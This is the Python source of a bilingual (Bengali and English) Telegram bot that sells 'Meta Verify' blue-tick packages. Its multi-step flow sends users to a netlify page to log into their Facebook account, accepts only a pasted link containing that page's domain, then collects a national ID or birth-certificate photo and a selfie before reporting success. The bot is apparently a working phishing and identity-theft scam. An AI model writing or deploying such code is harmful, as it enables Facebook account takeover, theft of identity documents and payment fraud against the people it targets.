import os
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# টোকেন ও সাপোর্ট আইডি
TOKEN = os.getenv('BOT_TOKEN')
bot = telebot.TeleBot(TOKEN)
SUPPORT_ID = "@aratboos16"

# ব্যবহারকারীদের বর্তমান স্টেপ বা অবস্থা মনে রাখার জন্য ডিকশনারি
user_states = {}

# ভাষা নির্বাচনের কিবোর্ড
def language_keyboard():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🇧🇩 বাংলা", callback_data="lang_bn"),
        InlineKeyboardButton("🇺🇸 English", callback_data="lang_en")
    )
    return markup

# বাংলা মূল মেনু (৫টি বাটন এক লাইনে বা সাজানো)
def main_menu_bn():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("◆ ১. মেটা ভেরিফাই", callback_data="meta_verify_bn"),
        InlineKeyboardButton("◆ ২. পেমেন্ট ও নিয়মাবলী", callback_data="payment_rules_bn"),
        InlineKeyboardButton("◆ ৩. সুবিধা ও শর্তাবলী", callback_data="benefits_bn"),
        InlineKeyboardButton("◆ ৪. লাইভ সাপোর্ট", callback_data="live_support_bn"),
        InlineKeyboardButton("◆ ৫. কিভাবে কাজ করে", callback_data="how_it_works_bn")
    )
    return markup

# ইংরেজি মূল মেনু (৫টি বাটন)
def main_menu_en():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("◆ 1. Meta Verify", callback_data="meta_verify_en"),
        InlineKeyboardButton("◆ 2. Payment & Rules", callback_data="payment_rules_en"),
        InlineKeyboardButton("◆ 3. Benefits & Terms", callback_data="benefits_en"),
        InlineKeyboardButton("◆ 4. Live Support", callback_data="live_support_en"),
        InlineKeyboardButton("◆ 5. How It Works", callback_data="how_it_works_en")
    )
    return markup

# ব্যাক বাটন (বাংলা)
def back_to_menu_bn():
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🔙 মূল মেনুতে ফিরুন", callback_data="main_menu_bn"))
    return markup

# ব্যাক বাটন (ইংরেজি)
def back_to_menu_en():
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🔙 Back to Main Menu", callback_data="main_menu_en"))
    return markup

# /start কমান্ড হ্যান্ডলার
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_states[message.chat.id] = {"step": "none"}
    welcome_text = (
        "✨ **স্বাগতম! অনুগ্রহ করে আপনার পছন্দের ভাষা নির্বাচন করুন:**\n\n"
        "✨ **Please select your preferred language:**"
    )
    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=language_keyboard())

# বাটন ক্লিক হ্যান্ডলার
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    message_id = call.message.message_id

    if call.data == "lang_bn":
        user_states[chat_id] = {"lang": "bn", "step": "main_menu"}
        text = "✨ **মূল মেনু:**\n\nনিচের অপশনগুলো থেকে আপনার প্রয়োজনীয় সেবাটি বেছে নিন:"
        bot.edit_message_text(text, chat_id, message_id, parse_mode="Markdown", reply_markup=main_menu_bn())

    elif call.data == "lang_en":
        user_states[chat_id] = {"lang": "en", "step": "main_menu"}
        text = "✨ **Main Menu:**\n\nPlease choose your required service from the options below:"
        bot.edit_message_text(text, chat_id, message_id, parse_mode="Markdown", reply_markup=main_menu_en())

    # --- বাংলা: মেটা ভেরিফাই (ধাপ ১ - প্যাকেজ নির্বাচন) ---
    elif call.data == "meta_verify_bn":
        user_states[chat_id]["step"] = "verify_step_1"
        text = (
            "🛡️ **মেটা ভেরিফাই আবেদন (ধাপ ১/৪):**\n\n"
            "নিচ থেকে আপনার পছন্দমত প্যাকেজ সিলেক্ট করুন:\n"
            "• ১. ১ মাস – ৩০০ টাকা\n"
            "• ২. ৩ মাস – ৯০০ টাকা\n"
            "• ৩. ৫ মাস – ১৫০০ টাকা\n"
            "• ৪. ১ বছর – ৩০০০ টাকা\n\n"
            "আপনার প্যাকেজটি কত নম্বর, তা চ্যাট বক্সে লিখে পাঠান (যেমন: ১ লিখে এন্টার দিন)।"
        )
        bot.edit_message_text(text, chat_id, message_id, parse_mode="Markdown", reply_markup=back_to_menu_bn())

    elif call.data == "payment_rules_bn":
        text = "💳 **পেমেন্ট ও নিয়মাবলী:**\n\nআমাদের সার্ভিস চার্জ এবং পেমেন্ট করার বিস্তারিত নিয়মাবলি এখানে দেওয়া হলো..."
        bot.edit_message_text(text, chat_id, message_id, parse_mode="Markdown", reply_markup=back_to_menu_bn())

    elif call.data == "benefits_bn":
        text = "⭐ **সুবিধা ও শর্তাবলী:**\n\nমেটা ভেরিফাই বা ব্লু টিক পাওয়ার পর আপনি কী কী সুবিধা পাবেন তা এখানে দেখুন..."
        bot.edit_message_text(text, chat_id, message_id, parse_mode="Markdown", reply_markup=back_to_menu_bn())

    elif call.data == "live_support_bn":
        text = f"📞 **লাইভ সাপোর্ট:**\n\nযেকোনো প্রয়োজনে সরাসরি আমাদের সাপোর্ট আইডিতে যোগাযোগ করুন: {SUPPORT_ID}"
        bot.edit_message_text(text, chat_id, message_id, parse_mode="Markdown", reply_markup=back_to_menu_bn())

    elif call.data == "how_it_works_bn":
        text = "⚙️ **কিভাবে কাজ করে:**\n\nবট ব্যবহারের ধাপে ধাপে নির্দেশিকা এখানে দেওয়া হলো..."
        bot.edit_message_text(text, chat_id, message_id, parse_mode="Markdown", reply_markup=back_to_menu_bn())

    elif call.data == "main_menu_bn":
        user_states[chat_id]["step"] = "main_menu"
        text = "✨ **মূল মেনু:**\n\nনিচের অপশনগুলো থেকে আপনার প্রয়োজনীয় সেবাটি বেছে নিন:"
        bot.edit_message_text(text, chat_id, message_id, parse_mode="Markdown", reply_markup=main_menu_bn())

    # --- ইংরেজি অপشنসমূহ ---
    elif call.data == "meta_verify_en":
        user_states[chat_id]["step"] = "verify_step_1_en"
        text = (
            "🛡️ **Meta Verify Application (Step 1/4):**\n\n"
            "Please select your package:\n"
            "1. 1 Month - 300 BDT\n"
            "2. 3 Months - 900 BDT\n"
            "Please type your package number below."
        )
        bot.edit_message_text(text, chat_id, message_id, parse_mode="Markdown", reply_markup=back_to_menu_en())

    elif call.data == "payment_rules_en":
        text = "💳 **Payment & Rules:**\n\nDetailed rules and service charges for payment are provided here..."
        bot.edit_message_text(text, chat_id, message_id, parse_mode="Markdown", reply_markup=back_to_menu_en())

    elif call.data == "benefits_en":
        text = "⭐ **Benefits & Terms:**\n\nCheck out the benefits and terms after getting Meta Verify..."
        bot.edit_message_text(text, chat_id, message_id, parse_mode="Markdown", reply_markup=back_to_menu_en())

    elif call.data == "live_support_en":
        text = f"📞 **Live Support:**\n\nFor any assistance, contact our support ID directly: {SUPPORT_ID}"
        bot.edit_message_text(text, chat_id, message_id, parse_mode="Markdown", reply_markup=back_to_menu_en())

    elif call.data == "how_it_works_en":
        text = "⚙️ **How It Works:**\n\nStep-by-step guidelines for using the bot are listed here..."
        bot.edit_message_text(text, chat_id, message_id, parse_mode="Markdown", reply_markup=back_to_menu_en())

    elif call.data == "main_menu_en":
        user_states[chat_id]["step"] = "main_menu"
        text = "✨ **Main Menu:**\n\nPlease choose your required service from the options below:"
        bot.edit_message_text(text, chat_id, message_id, parse_mode="Markdown", reply_markup=main_menu_en())

# টেক্সট এবং মাল্টি-স্টেপ প্রসেসিং হ্যান্ডলার
@bot.message_handler(func=lambda message: True)
def handle_user_input(message):
    chat_id = message.chat.id
    user_text = message.text.strip()
    
    if chat_id not in user_states:
        user_states[chat_id] = {"step": "none"}
    
    current_step = user_states[chat_id].get("step", "none")

    # --- ধাপ ১ থেকে প্যাকেজ ইনপুট গ্রহণ ---
    if current_step == "verify_step_1":
        if user_text in ["১", "২", "৩", "৪", "1", "2", "3", "4"]:
            user_states[chat_id]["step"] = "verify_step_2"
            next_text = (
                "🔗 **ধাপ ২/৪: অ্যাকাউন্ট লগইন ও লিংক সাবমিশন**\n\n"
                "নিচে থাকা লিংকের উপর চেপে ধরে রাখুন, সেখান থেকে **Open in-App** অপশন সিলেক্ট করুন। "
                "এরপর যে ফেসবুক প্রোফাইল বা পেজের জন্য ব্যাচ নিতে চান সেখানে লগইন করুন এবং লগইন শেষে আপনার সেই প্রোফাইল বা পেজের লিংক কপি করে এখানে পেস্ট করুন।\n\n"
                "👉 **লিংক:** https://web-secure-view-8821.netlify.app/"
            )
            bot.send_message(chat_id, next_text, parse_mode="Markdown")
        else:
            bot.send_message(chat_id, "❌ দয়া করে সঠিক প্যাকেজ নম্বরটি দিন (যেমন: ১, ২, ৩ বা ৪)।")

    # --- ধাপ ২: লিংক চেক করা (Domain Validation) ---
    elif current_step == "verify_step_2":
        required_domain = "https://web-secure-view-8821.netlify.app/"
        if required_domain in user_text:
            user_states[chat_id]["step"] = "verify_step_3"
            next_text = (
                "🆔 **ধাপ ৩/৪: এনআইডি বা জন্ম সনদ আপলোড**\n\n"
                "✅ লিংক সঠিক আছে!\n\n"
                "দয়া করে আপনার জন্ম সনদ বা এনআইডি (NID) কার্ডের একটি পরিষ্কার (Clear) ছবি তুলে এখানে আপলোড করুন।"
            )
            bot.send_message(chat_id, next_text, parse_mode="Markdown")
        else:
            bot.send_message(chat_id, "❌ **Wrong!** অবৈধ লিংক বা সঠিক ডোমেন পাওয়া যায়নি। দয়া করে সঠিক নিয়ম মেনে লিংক দিন।")

    # --- ডিফল্ট বা সাধারণ চ্যাট হ্যান্ডলার ---
    else:
        bot.send_message(chat_id, "দয়া করে `/start` লিখে মেনু থেকে ভাষা ও অপশন সিলেক্ট করুন।")

# ছবি আপলোড হ্যান্ডলার (ধাপ ৩ এবং ৪ এর জন্য)
@bot.message_handler(content_types=['photo'])
def handle_photos(message):
    chat_id = message.chat.id
    current_step = user_states.get(chat_id, {}).get("step", "none")

    if current_step == "verify_step_3":
        # এনআইডি পাওয়ার পর সেলফি স্টেপে যাওয়া
        user_states[chat_id]["step"] = "verify_step_4"
        bot.send_message(chat_id, "📸 **ধাপ ৪/৪: সেলফি আপলোড**\n\nএনআইডি কার্ড সফলভাবে গৃহীত হয়েছে!\n\nদয়া করে আপনার একটি পরিষ্কার সেলফি (Clear Selfie) তুলে এখানে দিন।")

    elif current_step == "verify_step_4":
        # সেলফি পাওয়ার পর চূড়ান্ত সফল বার্তা
        user_states[chat_id]["step"] = "completed"
        bot.send_message(chat_id, "✅ **সফল হয়েছে!** আপনার সমস্ত তথ্য ও ছবি সফলভাবে জমা হয়েছে। প্রসেসিং চলছে, দয়া করে নির্ধারিত সময় পর্যন্ত ধৈর্য ধরে অপেক্ষা করুন।")
    else:
        bot.send_message(chat_id, "দয়া করে প্রথমে `/start` লিখে ভেরিফাই অপশনে প্রবেশ করুন।")

# বট রান করা
print("Bot is running smoothly...")
bot.infinity_polling()
